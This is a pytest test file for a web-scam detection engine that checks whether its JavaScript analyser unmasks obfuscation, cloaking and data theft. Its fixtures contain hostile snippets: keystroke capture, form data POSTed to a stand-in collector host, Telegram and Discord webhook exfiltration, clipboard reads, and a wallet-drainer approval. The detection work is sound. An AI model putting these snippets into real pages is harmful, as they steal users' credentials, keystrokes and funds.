import base64

import pytest

from scamshield.engine.jsanalysis import analyse_script, fold, html_fragments, navigation_targets, select_scripts

PAGE = "https://shop.example.ae/checkout"


@pytest.mark.parametrize(
    "expr, expected",
    [
        ('"https://" + "evil" + ".example/x"', "https://evil.example/x"),
        (f'atob("{base64.b64encode(b"https://a.example/").decode()}")', "https://a.example/"),
        ("String.fromCharCode(104,116,116,112,58,47,47,120,46,105,111)", "http://x.io"),
        ('"moc.elpmaxe-lived//:sptth".split("").reverse().join("")', "https://devil-example.com"),
        ('["https:", "", "b.example", "p"].join("/")', "https://b.example/p"),
        ('location.origin + "/login"', "https://shop.example.ae/login"),
        ('decodeURIComponent("https%3A%2F%2Fc.example%2F")', "https://c.example/"),
        ('"\\x68ttps://d.example"', "https://d.example"),
        ("userInput + '/x'", None),
        ("getTarget()", None),
    ],
)
def test_fold_resolves_static_strings_only(expr, expected):
    assert fold(expr, {}, PAGE) == expected


def test_navigation_targets_follow_variables_and_every_branch():
    code = """
    var base = "https://login-verify.example";
    const path = '/' + 'secure';
    if (navigator.webdriver) { location.href = "/blank.html"; }
    else { window.location.replace(base + path); }
    setTimeout(function(){ document.location = atob("aHR0cHM6Ly9uZXh0LmV4YW1wbGUv"); }, 4000);
    if (a == location.href) {}
    """
    assert navigation_targets(code, PAGE) == [
        "https://shop.example.ae/blank.html", "https://login-verify.example/secure", "https://next.example/",
    ]


def test_minified_but_honest_code_is_not_obfuscated():
    code = ("function a(b,c){return b+c}var d=document.querySelector('.cart');d&&d.addEventListener('click',"
            "function(e){e.preventDefault();fetch('/api/cart',{method:'GET'}).then(function(r){return r.json()})});") * 40
    finding = analyse_script(code, src=f"{PAGE}.js", page_url=PAGE)
    assert not finding.obfuscated and finding.obfuscation_markers == []
    assert finding.endpoints == ["https://shop.example.ae/api/cart"] and finding.suspicious_calls == []


def test_packer_and_encoded_eval_are_obfuscation():
    packed = "eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0 1',2,2,'var|x'.split('|'),0,{}))"
    assert analyse_script(packed, src=None, page_url=PAGE).obfuscation_markers[:1] == ["eval_packer"]
    encoded = "eval(atob('dmFyIGE9MQ=='));"
    assert analyse_script(encoded, src=None, page_url=PAGE).obfuscated


def test_exfiltration_and_hostile_behaviour():
    token = base64.b64encode(b"https://api.telegram.org/bot123:ABC/sendMessage").decode()
    code = f"""
    var k = '';
    document.addEventListener('keydown', function (e) {{ k += e.key; }});
    document.addEventListener('contextmenu', function (e) {{ e.preventDefault(); }});
    document.onkeydown = function (e) {{ if (e.keyCode == 123) return false; }};
    var u = atob("{token}");
    fetch("https://collector.example.net/p", {{ method: "POST", body: new FormData(f) }});
    $.post("/local", {{}});
    fetch("https://discord.com/api/webhooks/1/abc", {{method: 'POST'}});
    navigator.clipboard.readText();
    """
    calls = set(analyse_script(code, src=None, page_url=PAGE).suspicious_calls)
    assert {
        "telegram_bot_api", "discord_webhook", "keystroke_capture", "disable_right_click", "devtools_block",
        "clipboard_read", "posts_to_external_host:collector.example.net", "posts_to_external_host:discord.com",
    } <= calls
    assert not any(c.endswith("shop.example.ae") for c in calls)


def test_cloaking_gates():
    code = """
    if (document.referrer.indexOf('google') < 0) { document.body.innerHTML = ''; }
    if (Math.random() > 0.5) { location.href = '/real'; }
    if (!navigator.cookieEnabled) { } else { window.location = '/landing'; }
    document.addEventListener('mousemove', function () { document.getElementById('f').style.display = "block"; });
    setTimeout(function () { document.getElementById('c').innerHTML = '<form></form>'; }, 5000);
    """
    calls = set(analyse_script(code, src=None, page_url=PAGE).suspicious_calls)
    assert {"cloak.referrer_gate", "cloak.random_gate", "cloak.cookie_gate", "cloak.mouse_gate", "cloak.timer_gate"} <= calls


@pytest.mark.parametrize(
    "code",
    [
        "setTimeout(() => { toast.style.display = 'none'; }, 5000);",
        "setTimeout(function () { box.innerHTML = response.html; }, 4000);",
        "if (/iPhone|Android/.test(navigator.userAgent)) { banner.style.display = 'block'; }",
        "if (/Android/.test(navigator.userAgent)) { location.href = 'https://play.google.com/store/apps/x'; }",
        "if (document.referrer) { analytics.track(document.referrer); }",
        "setTimeout(function () { track('banner'); window.location.href = storeUrl; }, 4000);",
    ],
)
def test_ordinary_ui_code_is_not_a_cloaking_gate(code):
    assert analyse_script(code, src=None, page_url=PAGE).suspicious_calls == []


def test_wallet_drainer():
    code = "await window.ethereum.request({method:'eth_requestAccounts'}); nft.setApprovalForAll(attacker, true);"
    calls = analyse_script(code, src=None, page_url=PAGE).suspicious_calls
    assert "wallet_drainer" in calls and "wallet_connect" not in calls


def test_injected_form_markup_is_recovered_even_from_base64():
    hidden = base64.b64encode(b'<input type="password" name="pin">').decode()
    code = f"el.innerHTML = '<form action=\"https://x.example/c\">' + atob('{hidden}') + '</form>';"
    assert 'type="password"' in html_fragments(code) and "<form" in html_fragments(code)
    assert html_fragments("var a = '<b>bold</b>';") == ""


def test_select_scripts_skips_vendors_and_prioritises_first_party():
    srcs = [
        "https://www.googletagmanager.com/gtm.js?id=X",
        "https://challenges.cloudflare.com/turnstile/v0/api.js",
        "https://shop.example.ae/cdn-cgi/challenge-platform/h/b/orchestrate/jsch/v1",
        "https://cdn.example-cdn.net/js/jquery-3.7.1.min.js",
        "https://kit.example-attacker.top/a.js",
        "https://static.example.ae/app.js",
    ]
    fetch, skipped = select_scripts(srcs, PAGE)
    assert fetch == [("https://static.example.ae/app.js", True), ("https://kit.example-attacker.top/a.js", False)]
    assert len(skipped) == 4
